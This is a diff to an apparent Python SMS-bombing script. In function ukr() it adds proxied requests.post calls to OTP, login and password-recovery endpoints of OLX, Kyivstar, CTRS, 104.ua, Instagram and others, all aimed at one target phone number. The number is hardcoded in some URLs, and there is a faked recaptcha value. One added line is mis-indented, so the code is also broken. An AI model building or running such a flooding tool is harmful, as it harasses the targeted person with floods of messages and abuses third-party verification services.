@@ -137,6 +137,39 @@ def ukr():
                 except:
                         pass
                 try:
+                formatted_phone = format_phone(number, "+###+##+###+##+##")
+                 requests.post("https://www.olx.ua/account/?phone=380966579780", json={"number": number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                 requests.post("https://www.olx.ua/account/?phone", json={"number": number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                       requests.post("https://www.olx.ua/account/forgotpassword/?bs=login_page_forgot_password_button&prefilledUsername=MzgwOTY2NTc5Nzgw", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                       requests.post("https://my.ctrs.com.ua/ru/auth/sms_code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                      requests.post("https://my.ctrs.com.ua/ru/auth/login", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                       requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                       requests.post("https://account.104.ua/signup?step=3", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
+                       requests.post("https://account.kyivstar.ua/cas/auth/otp.rpc", json={"phone": "+" + number}, headers=headers, proxies=proxies)
+                except:
+                        pass
+                try:
                         requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": " eyJpdiI6ImFEZlI2RlNEb2ZZSWM1NWVBYmgyRUE9PSIsInZhbHVlIjoiWHNSa21RS1gwVEV2Q3M0OSt6QjY0MWphcXNUSVdLQkNwazlFa3ZzYllJUW9LWXF2T3VOUXJuUjhTMStoRFB1RyIsIm1hYyI6ImE1ZTJkNzJmNjk2NWJlMjc0OGFlN2Y1MGU5MjE3NWU1MzM0Njc1MmUzNGFmZDBhZDBlMjAxOWE0MGY3NTVjYzUifQ", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
                         pass
                 except:
